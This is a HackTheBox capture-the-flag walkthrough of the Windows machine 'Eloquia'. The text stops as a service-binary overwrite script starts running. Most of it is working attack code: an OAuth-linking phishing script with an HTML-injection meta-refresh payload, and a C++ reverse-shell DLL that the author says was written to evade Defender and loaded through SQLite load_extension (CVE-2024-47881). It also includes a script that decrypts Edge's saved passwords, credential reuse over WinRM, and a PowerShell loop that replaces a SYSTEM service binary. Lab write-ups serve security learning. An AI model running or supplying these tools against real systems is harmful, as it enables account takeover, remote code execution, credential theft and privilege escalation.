# Eloquia — HackTheBox (Insane, Windows)

**Target IP:** `10.129.xx.xx`
**Attacker (VPN) IP:** `10.10.xx.xx`

---

## 1. Reconnaissance

### 1.1 Nmap scan

```
nmap -sV -sC 10.129.xx.xx
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 05:21 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eloquia.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 28.04 seconds
```

Only two ports are open:
- **80/tcp** — IIS, redirects to `http://eloquia.htb/`
- **5985/tcp** — WinRM (HTTPAPI), useful later once credentials are obtained

Since port 80 redirects to a hostname, that hostname needs to be resolved locally.

### 1.2 Adding the host entry

```
cat /etc/hosts
10.129.xx.xx    eloquia.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### 1.3 Virtual host / subdomain brute force

```
ffuf -u http://eloquia.htb/ -H "Host: FUZZ.eloquia.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://eloquia.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.eloquia.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

:: Progress: [5000/5000] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

No results — no additional subdomains found via this wordlist against `eloquia.htb`.

### 1.4 Directory brute force

```
dirb http://eloquia.htb/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Mar 17 05:24:03 2026
URL_BASE: http://eloquia.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://eloquia.htb/ ----
+ http://eloquia.htb/about (CODE:301|SIZE:0)
+ http://eloquia.htb/contact (CODE:301|SIZE:0)

-----------------
END_TIME: Tue Mar 17 05:38:33 2026
DOWNLOADED: 4612 - FOUND: 2
```

Only `/about` and `/contact` — nothing else of interest. At this point, browsing the site manually became necessary. While walking through the application, a link/reference to a second application, **Qooqle**, was discovered (this acts as an OAuth-style identity provider that Eloquia integrates with for account linking). This second host was added to `/etc/hosts`:

```
cat /etc/hosts
10.129.xx.xx    eloquia.htb qooqle.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

---

## 2. Web Application Analysis — Eloquia + Qooqle OAuth Linking

Manual enumeration of the Eloquia web app revealed an **account-linking / OAuth flow** with Qooqle: a logged-in Eloquia user can link their account to a Qooqle account through an OAuth-style callback URL.

**Vulnerability found:** the OAuth linking callback **does not implement a `state` parameter**.

Why this matters (in plain terms): the `state` parameter in an OAuth flow is supposed to tie the callback request to *the specific browser session that started the flow*, so nobody else can hijack it. Without it, if an attacker can get their own OAuth authorization code delivered to a victim's browser (i.e. get the victim's browser to hit the callback URL with the *attacker's* code), the victim's Eloquia account gets linked to the *attacker's* Qooqle account — not their own.

This is powerful because:
- If a normal user visits the crafted callback URL, that user's Eloquia account gets linked to the attacker's Qooqle account.
- If the **admin** can be tricked into visiting that URL, the **admin's Eloquia account** gets linked to the attacker's Qooqle identity — and since login via Qooqle is trusted, the attacker can then log in *as admin* through the Qooqle OAuth login flow.

### 2.1 Second bug needed — a way to reach the admin

Linking the admin's account requires the admin to visit our attacker-controlled callback URL. Manual review of the article-submission feature (Eloquia lets registered users submit articles, which are then reviewed by an admin) revealed an **HTML Injection vulnerability** in the article content/review pipeline.

Combined, the exploit chain is:
1. Register a normal Eloquia account.
2. Submit a malicious article containing HTML injection payload that will redirect/lure the admin's browser to our OAuth callback URL with our authorization code.
3. Report the article so an admin reviews it (triggering the injected HTML/JS in the admin's browsing context).
4. The admin's browser visits the crafted callback URL → admin's Eloquia account becomes linked to our Qooqle identity.
5. Log in via "Sign in with Qooqle" as the attacker's Qooqle account → land in the application as the linked admin's Eloquia session.

### 2.2 Preparing a valid article banner

The article submission form required a banner image meeting specific dimension/size constraints. A small Python helper (`create.py`) was written to auto-generate a compliant placeholder banner:

```python
import os
import random
from PIL import Image, ImageDraw, ImageFont

def generate_banner(output_path="banner.png", width=750, height=500):
    # 1. Create a new RGB image
    image = Image.new("RGB", (width, height))
    draw = ImageDraw.Draw(image)
    
    # 2. Draw the base gradient
    color1 = (26, 42, 108)   # Dark Blue
    color2 = (178, 31, 31)   # Red/Purple
    
    for y in range(height):
        ratio = y / height
        r = int(color1[0] * (1 - ratio) + color2[0] * ratio)
        g = int(color1[1] * (1 - ratio) + color2[1] * ratio)
        b = int(color1[2] * (1 - ratio) + color2[2] * ratio)
        draw.line([(0, y), (width, y)], fill=(r, g, b))
        
    # 3. Break the compression! Add random pixel noise.
    # This slightly alters pixel values so the PNG compressor can't compress it to 4KB.
    pixels = image.load()
    for y in range(height):
        for x in range(width):
            r, g, b = pixels[x, y]
            # Add a tiny random variation (-12 to +12 color intensity)
            noise = random.randint(-12, 12)
            # Ensure values stay within 0-255 bounds
            nr = max(0, min(255, r + noise))
            ng = max(0, min(255, g + noise))
            nb = max(0, min(255, b + noise))
            pixels[x, y] = (nr, ng, nb)

    # 4. Add the centered text
    try:
        font = ImageFont.load_default()
    except Exception:
        font = None

    text = "BANNER PLACEHOLDER"
    
    if font:
        bbox = draw.textbbox((0, 0), text, font=font)
        text_width = bbox[2] - bbox[0]
        text_height = bbox[3] - bbox[1]
        text_x = (width - text_width) // 2
        text_y = (height - text_height) // 2
        
        draw.text((text_x + 2, text_y + 2), text, fill=(0, 0, 0), font=font)
        draw.text((text_x, text_y), text, fill=(255, 255, 255), font=font)

    # 5. Save the file (optimize=False ensures the compressor doesn't over-shrink it)
    image.save(output_path, "PNG", optimize=False)
    
    # Verification
    file_size_kb = os.path.getsize(output_path) / 1024
    print(f"Success! Saved to: {output_path}")
    print(f"Dimensions: {width}x{height}")
    print(f"File Size: {file_size_kb:.2f} KB (Target: 20KB - 1000KB)")

if __name__ == "__main__":
    generate_banner()
```

```
python3 create.py
Success! Saved to: banner.png
Dimensions: 750x500
File Size: 423.38 KB (Target: 20KB - 1000KB)
```

### 2.3 Capturing our own OAuth CSRF token / session ID

To build the automated exploit we first needed a legitimate CSRF token + session cookie for **our own attacker-controlled account**, obtained by manually starting the "Link Qooqle account" flow ourselves and intercepting the request in Burp Suite:

- CSRF token: `[REDACTED]`
- Session ID: `[REDACTED]`

### 2.4 Automating the phishing chain

An automation script (`oauth.py`) was written to:
1. Stand up a small local HTTP listener/handler (to catch the admin's callback code once phished).
2. Log in as our attacker account using the captured CSRF token/session.
3. Create a malicious article containing the HTML-injection payload (redirecting the admin to our OAuth callback with our authorization code).
4. Submit/report the article so it lands in front of the admin for review.
5. Wait for the admin to view it, be redirected, and hit our listener — capturing the resulting callback/authorization code.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import re
import requests
import sys

# COPY THESE VARS
"""
Copy from any authorized req Cookie
Cookie: csrftoken=******; sessionid=******
"""

# some definition
if len(sys.argv) != 5:
    print(f"usage: python3 {sys.argv[0]} [ip] [port] [csrftoken] [sessionid]")
    sys.exit(0)
LISTEN_IP, LISTEN_PORT, CSRF_COOKIE, SESSION_ID = sys.argv[1:5]
LISTEN_PORT = int(LISTEN_PORT)

# ok this one fills up automatically
COOKIES = {
    "csrftoken":CSRF_COOKIE,
    "sessionid":SESSION_ID,
    "schema_sidebar_open":"false"
}

# for troubleshooting?
PROXIES = {}

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/bait.html':
            print("[+] Admin got phished!!!")
            # input the code manually once admin is connected
            code = input("[?] Input callback code: ")
            # 302 redirect to link admin account to qooqle
            self.send_response(302)
            self.send_header('Location', f'http://eloquia.htb/accounts/oauth2/qooqle/callback/?code={code}')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def get_csrf(body):
    match = re.search(r'(?<=value=")\w{64}(?=">)', body)
    if match:
        print(f"[+] Found csrf: {match.group(0)}")
        return match.group(0)
    raise ValueError("[-] CSRF token not found!")

def poison_article():
    ARTICLE_URL = "http://eloquia.htb/article/create/"
    r = requests.get(ARTICLE_URL, cookies=COOKIES, proxies=PROXIES)
    title = "NICE ARTICLE"
    # extract csrfmiddlewaretoken which is every time new once any page is reloaded
    cmw_token = get_csrf(r.text)
    # obfuscated payload
    # original: <p><meta http-equiv="refresh" content="0;url=http://10.10.16.157:8443/bait.html"></p>
    payload = f"&lt;p&gt;&lt;meta http-equiv = \"refresh\" content = \"0; url=http://{LISTEN_IP}:{LISTEN_PORT}/bait.html\" &gt;&lt;/p&gt;"
    banner = None
    data = {
        "title": title,
        "csrfmiddlewaretoken": cmw_token,
        "content": payload,
    }
    
    with open("banner.png", "rb") as f:
        banner = {"banner": ("image.png", f.read(), "image/png")}

    # disable redirect to prevent self pwn
    r = requests.post(ARTICLE_URL, data=data, files=banner, allow_redirects=False, cookies=COOKIES, proxies=PROXIES)
    
    # get article ID for later
    loc_header = r.headers["Location"]
    article_id = loc_header.strip('/').split('/')[-1]
    print("[*] CSRF Article created: ", article_id)
    return article_id

def report_article(id):
    REPORT_URL = f"http://eloquia.htb/article/report/{id}/"
    r = requests.get(REPORT_URL, cookies=COOKIES, proxies=PROXIES, allow_redirects=False)
    if r.status_code == 302:
        print(f"[+] Article {id} reported")

print("[*] Creating malicious article ...")
report_id = poison_article()
# report the article now
report_article(report_id)
print("[*] Phishing admin now ...")
HTTPServer(('', LISTEN_PORT), Handler).serve_forever()
```

Usage:

```
usage: python3 oauth.py [ip] [port] [csrftoken] [sessionid]
```

Execution:

```
python3 oauth.py 10.10.xx.xx 4444 [REDACTED_CSRF] [REDACTED_SESSIONID]
[*] Creating malicious article ...
[+] Found csrf: [REDACTED]
[*] CSRF Article created:  13
[+] Article 13 reported
[*] Phishing admin now ...
[+] Admin got phished!!!
[?] Input callback code: [REDACTED]
10.129.xx.xx - - [06/Jul/2026 08:54:27] "GET /bait.html HTTP/1.1" 302 -
```

The script prompted for the intercepted callback code once the admin was phished (this is entered manually, taken from the printed listener output above).

After entering the code and waiting a short time, logging in via "Sign in with Qooqle" gave us an **authenticated admin session** on Eloquia.

> **Proof-of-concept note:** this whole chain works purely because of the missing `state` parameter on the OAuth callback plus the HTML injection in the article review path — no credentials were guessed or brute-forced to get admin; it was pure logic/CSRF abuse.

---

## 3. From Admin Panel to Remote Code Execution — CVE-2024-47881

### 3.1 Discovering SQL Explorer

Inside the admin panel there is a **SQL Explorer** feature that lets an admin run arbitrary SQL queries against the backend database.

```sql
PRAGMA database_list;
```

Output:
```
C:\Web\Eloquia\db.sqlite3
```

This confirmed the backend is SQLite, and that we have a raw query interface into it.

### 3.2 Attempting to crack extracted hashes

Password hashes were dumped from the database and attempted against common wordlists/cracking tools, but this was **not successful** (hashes were strong enough to resist offline cracking in reasonable time).

### 3.3 SQLite `load_extension` RCE — CVE-2024-47881

Because this backend appeared to be powered by an OpenRefine-derived database explorer, the following known vulnerability was applicable:

> **CVE-2024-47881** — In OpenRefine's `database` extension, the `enable_load_extension` property can be enabled for SQLite integrations. This lets an attacker load a local or remote extension **DLL** through a SQLite query and achieve arbitrary code execution on the server. Affects versions **3.4-beta through 3.8.2**; fixed in **3.8.3**.
>
> References:
> - https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8
> - https://nvd.nist.gov/vuln/detail/CVE-2024-47881
> - https://github.com/OpenRefine/OpenRefine/commit/853a1d91662e7dc278a9a94a38be58de04494056

The core idea: SQLite supports a `load_extension()` SQL function that loads a native shared library (a `.dll` on Windows) and executes its entry point. If an attacker can (a) get `enable_load_extension` turned on, and (b) get a malicious DLL onto a path the SQLite engine can reach (local disk, or a remote SMB share), then a single `SELECT load_extension('path\to\file.dll');` query results in code execution as the SQLite engine's host process.

### 3.4 Getting a DLL onto the target without triggering Defender

A quick test with a standard `msfvenom`-generated DLL was attempted first, but **Windows Defender flagged/blocked it** — so a custom DLL was built on Visual Studio instead, using raw WinAPI/socket calls to avoid known signatures.

`pch.h` (precompiled header):

```cpp
// pch.h: This is a precompiled header file.
// Files listed below are compiled only once, improving build performance for future builds.
// This also affects IntelliSense performance, including code completion and many code browsing features.
// However, files listed here are ALL re-compiled if any one of them is updated between builds.
// Do not add files here that you will be updating frequently as this negates the performance advantage.

#pragma once

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib") // ensure Winsock functions are linked

// add headers that you want to pre-compile here
#include "framework.h"
#include <winsock2.h>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
```

`run.cpp` (DLL entry point / reverse-shell logic):

```cpp
#include "pch.h"
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP "10.10.xx.xx"
# define CLIENT_PORT 443
#endif

void reverse_shell(void* arg) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

    if (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    STARTUPINFOA sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;

    PROCESS_INFORMATION pinfo;
    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(sockt);
    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        _beginthread(reverse_shell, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

The DLL was compiled as `run.dll` (build details are environment-specific — e.g. Visual Studio project with an appropriate `DllMain` calling back to the attacker's listener on load).

### 3.5 Uploading the DLL via the article banner upload

Rather than the intended banner image, the compiled `run.dll` was uploaded through the same **article banner upload** feature used earlier (which does not appear to strictly validate file type/content), landing at:

```
static/assets/images/blog/run.dll
```

### 3.6 Setting up the listener

```
penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 192.168.1.66 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

### 3.7 Triggering the DLL load via SQL Explorer

```sql
SELECT load_extension('static/assets/images/blog/run.dll');
```

Result — shell received:

```
penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 192.168.1.66 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ELOQUIA~10.129.xx.xx-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
[+] Logging to /home/kali/.penelope/sessions/ELOQUIA~10.129.xx.xx-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_03_18-06_18_02-506.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────
C:\Web\Eloquia>whoami
eloquia\web
```

We are now executing code as `eloquia\web`.

### 3.8 User flag

```
C:\Users\web\Desktop>type user.txt
[REDACTED USER FLAG]
```

---

## 4. Lateral Movement — Browser Credential Extraction (Password Reuse)

As `eloquia\web`, further enumeration of the user's profile revealed the **Microsoft Edge** browser profile — specifically two artifacts commonly targeted for extracting saved logins:

- **`Login Data`** — an SQLite database containing saved site credentials (passwords stored encrypted with a per-browser-profile key).
- **`Local State`** — a JSON file containing the **encrypted master key** used to decrypt entries in `Login Data` (on Windows this master key is itself protected by DPAPI, tied to the logged-in user).

### 4.1 Locating the Edge profile

```
C:\Users\web\AppData\Local\Microsoft\Edge\User Data>dir
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data

10/22/2025  11:54 AM    <DIR>          .
10/22/2025  11:54 AM    <DIR>          ..
04/20/2024  12:11 PM    <DIR>          Autofill
04/20/2024  12:11 PM    <DIR>          AutoLaunchProtocolsComponent
10/21/2025  02:31 PM    <DIR>          BrowserMetrics
10/21/2025  02:32 PM         4,194,304 BrowserMetrics-spare.pma
04/20/2024  12:11 PM    <DIR>          CertificateRevocation
04/20/2024  12:10 PM    <DIR>          Crashpad
10/22/2025  11:54 AM    <DIR>          Default
...
10/22/2025  11:54 AM            57,640 Local State
...
              11 File(s)      4,367,242 bytes
              37 Dir(s)   5,463,928,832 bytes free
```

```
C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default>dir
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default

...
10/22/2025  11:54 AM            51,200 Login Data
10/22/2025  11:54 AM                 0 Login Data-journal
...
              46 File(s)      1,165,137 bytes
              46 Dir(s)   5,463,928,832 bytes free
```

Both target files (`Local State` and `Login Data`) were confirmed present.

### 4.2 Staging tooling on the target via SMB

Since we need to run a Python decryption script (and it needs `pycryptodomex` + `pywin32` to reverse Chromium's DPAPI + AES-GCM credential encryption), an SMB share was stood up on the attacking machine to move files back and forth:

```
sudo impacket-smbserver share . -smb2support -user user1 -password [REDACTED]
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
```

Mounting it from the target:

```
C:\Users\web\Desktop>net use \\10.10.xx.xx\share /u:user1 [REDACTED]
The command completed successfully.
```

Installing required Python packages (offline wheel files transferred over the same share, since the target has no internet access):

```
C:\Users\web\Desktop>"c:\Program Files\Python311\python.exe" -m pip install pycryptodomex-3.23.0-cp37-abi3-win_amd64.whl
Defaulting to user installation because normal site-packages is not writeable
Processing c:\users\web\desktop\pycryptodomex-3.23.0-cp37-abi3-win_amd64.whl
Installing collected packages: pycryptodomex
Successfully installed pycryptodomex-3.23.0

C:\Users\web\Desktop>"c:\Program Files\Python311\python.exe" -m pip install pywin32-306-cp311-cp311-win_amd64.whl
Defaulting to user installation because normal site-packages is not writeable
Processing c:\users\web\desktop\pywin32-306-cp311-cp311-win_amd64.whl
Installing collected packages: pywin32
Successfully installed pywin32-306
```

Copying the decryption script and the two target artifacts:

```
C:\Users\web\Desktop>copy \\10.10.xx.xx\share\Decrypt.py C:\Users\web\Desktop\
        1 file(s) copied.

C:\Users\web\Desktop>copy "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State" "C:\Users\web\local_state.json"
        1 file(s) copied.

C:\Users\web\Desktop>copy "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "C:\Users\web\login_data.json"
        1 file(s) copied.
```

### 4.3 Decryption script

`Decrypt.py` (logic, in plain terms): reads the AES master key out of `Local State`, unwraps it using Windows DPAPI (since we're running *as the same user the browser data belongs to*, `CryptUnprotectData` succeeds without needing the user's actual login password), then uses that unwrapped key to AES-GCM–decrypt each stored password blob inside the `Login Data` SQLite database.

```python
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_master_key(local_state_path):
    with open(local_state_path, "r") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode() 
        return decrypted_pass
    except:
        return "Failed to decrypt"

def main():
    local_state_path = "c:\\Users\\web\\local_state.json" 
    login_db_path = "c:\\Users\\web\\login_data.json" 
    master_key = get_master_key(local_state_path)
    
    shutil.copy2(login_db_path, "temp_login.db")
    conn = sqlite3.connect("temp_login.db")
    cursor = conn.cursor()
    
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n")
    except Exception as e:
        print(f"Error: {e}")
    
    cursor.close()
    conn.close()
    os.remove("temp_login.db")

if __name__ == "__main__":
    main()
```

### 4.4 Running it — proof of password reuse

```
C:\Users\web\Desktop>"c:\Program Files\Python311\python.exe" Decrypt.py
URL:
User: olivia.kat
Pass: Failed to decrypt

URL: http://eloquia.htb/accounts/login/
User: Olivia.KAT
Pass: [REDACTED]

URL:
User: test
Pass: [REDACTED]

URL:
User: olivia.kat
Pass: [REDACTED]
```

Four saved credential entries were recovered from Edge's password store. One entry is explicitly tied to `http://eloquia.htb/accounts/login/` for user `Olivia.KAT`.

**This is the password-reuse check / proof:** the credentials recovered here for `Olivia.KAT` were tested directly against WinRM (a completely different service/protocol than the web login they were saved for), and they worked — confirming the user reused the same web-login password for their actual Windows domain account:

```
evil-winrm -i 10.129.xx.xx -u Olivia.kat -p [REDACTED]

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> whoami
eloquia\olivia.kat
```

We now have an interactive session as `eloquia\olivia.kat` over WinRM — confirmed password reuse between the web application and the Windows domain account.

---

## 5. Privilege Escalation — Race Condition in the "Failure2Ban" Service

### 5.1 Enumerating Olivia's desktop

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> dir

    Directory: C:\Users\Olivia.KAT\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   1:53 PM           1558 Failure2Ban - Prototype - Shortcut.lnk
-a----         5/6/2024   2:00 PM        1331957 Logfile.PML
-a----        4/22/2024   7:02 AM            362 Todo.txt
```

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> type Todo.txt
[X] implement App.config file
[X] implement file type filtering
[] read firewall rules on service start
[] implement malicious input detection algorithm
[] avoid reading the whole "log" file on every service recall
-------------------------------
Problem: service is eating the CPU at huge log file size
Solution(temporary): Log rotation & service restart
```

This to-do list points at a custom in-house service called **"Failure2Ban"** — an intrusion-prevention-style prototype tool, still under development (note the unchecked/incomplete items), that watches log files.

### 5.2 Locating the service binary and its config

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> Get-ChildItem -Path "C:\" -Recurse -File -Filter "App.config" -ErrorAction SilentlyContinue

    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/25/2024  11:32 AM            273 App.config
```

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> reg query HKLM\SYSTEM\CurrentControlSet\Services\Failure2Ban /v ImagePath

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Failure2Ban
    ImagePath    REG_EXPAND_SZ    C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
```

This confirms `Failure2Ban` is registered as a **Windows service**, running the binary at that path. Services generally run with high privileges (often `NT AUTHORITY\SYSTEM`), so if we can get *our own* executable to run in place of the legitimate one, we escalate privileges.

### 5.3 Checking file permissions on the service binary

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe ELOQUIA\Olivia.KAT:(I)(RX,W)
                                                                                                   NT AUTHORITY\SYSTEM:(I)(F)
                                                                                                   BUILTIN\Administrators:(I)(F)
                                                                                                   BUILTIN\Administrators:(I)(F)
                                                                                                   BUILTIN\Users:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Key finding:** `ELOQUIA\Olivia.KAT` has **Write (W)** permission on the actual service executable, in addition to Read/Execute. That means our current user can *overwrite* the binary that the SYSTEM-level service will execute.

### 5.4 The catch — timing / race condition

Simply overwriting the file at rest is not enough on its own if the service is already running and the file is locked, or if there's some file-monitoring/restart behavior in play (recall the to-do note about "avoid reading the whole log file on every service recall" — this service appears to restart/reload frequently due to performance issues with a large log file, per `Logfile.PML`/the to-do notes). In practice here, the window to swap the file (while it's momentarily not locked, e.g. between service restarts) is narrow — hence a **race condition** approach: continuously retry the file copy in a tight loop until it succeeds.

### 5.5 Building the malicious replacement binary

A small C payload (`copy_flag.c`) was written — its purpose is simply to run with whatever privileges the service inherits and copy the protected `root.txt` flag to a location the low-privileged user can read (a stand-in for a more general "do anything as SYSTEM" payload):

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Define the source and destination paths
    const char* source = "C:\\Users\\Administrator\\Desktop\\root.txt";
    const char* dest = "C:\\Users\\Olivia.KAT\\Desktop\\root.txt";

    // CopyFileA(existing_file, new_file, fail_if_exists)
    // Setting the last parameter to FALSE allows overwriting
    if (CopyFileA(source, dest, FALSE)) {
        printf("[+] Success: File copied to %s\n", dest);
    } else {
        // If it fails, get the specific Windows error code
        printf("[-] Error: Failed to copy file. Error code: %lu\n", GetLastError());
        printf("Note: Ensure you have permissions to read the Administrator's Desktop.\n");
    }

    return 0;
}

```

Compiled with MinGW cross-compiler from Kali:

```
x86_64-w64-mingw32-gcc copy_flag.c -o copy_flag.exe
```

Renamed to match the expected service binary name so it can be dropped straight into place:

```
cp copy_flag.exe Failure2Ban.exe
```

### 5.6 Delivering the payload to the target

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> net use \\10.10.xx.xx\share /u:user1 [REDACTED]
The command completed successfully.
```

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> copy \\10.10.xx.xx\share\Failure2Ban.exe C:\Users\Olivia.KAT\Documents\
```

### 5.7 The race condition script

A PowerShell loop (`race.ps1`) was used to continuously attempt to overwrite the real service binary with our malicious one, until the moment the file is briefly unlocked (e.g. during a service restart cycle) allows the copy through:

```powershell
$source = "C:\Users\Olivia.KAT\Documents\Failure2Ban.exe"
$target = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

Write-Host "Trying to overwrite: $target"

while ($true) {
    try {
        Copy-Item -Path $source -Destination $target -Force
        Write-Host "[+] SUCCESS" -ForegroundColor Green
        break
    } catch {
    }
    Start-Sleep -Seconds 0.5
}
```

In plain terms: this just keeps trying to copy our file over the real one every half-second, silently swallowing errors (like "file in use") until one attempt finally succeeds — which happens the moment the service releases its lock on the file (e.g. right before/after an automatic restart).

Uploading and running it:

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> copy \\10.10.xx.xx\share\race.ps1 C:\Users\Olivia.KAT\Documents\
```

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> .\race.ps1
